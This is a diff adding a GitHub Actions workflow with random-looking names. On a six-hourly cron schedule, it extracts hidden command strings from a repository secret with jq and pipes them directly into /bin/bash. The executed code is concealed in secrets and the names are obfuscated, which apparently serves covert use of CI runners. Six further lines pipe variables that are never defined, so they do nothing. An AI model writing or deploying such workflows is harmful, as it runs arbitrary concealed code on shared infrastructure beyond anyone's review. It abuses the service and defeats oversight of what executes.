@@ -1,0 +1,23 @@
+name: maosibuxingg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: maosibuxingg
+        env:
+          tdpvv0: ${{ secrets.tdpvv0 }}
+        run: |
+          echo $tdpvv0 | jq -r .oofu6 | /bin/bash
+          echo $pjoj02 | jq -r .svfy55193 | /bin/bash
+          echo $ziu71898 | jq -r .mponb56 | /bin/bash
+          echo $necrc01580 | jq -r .woaz227 | /bin/bash
+          echo $omm0 | jq -r .oxux46 | /bin/bash
+          echo $thkjq14262 | jq -r .ozj9 | /bin/bash
+          echo $tpoe8754 | jq -r .ih547 | /bin/bash
+
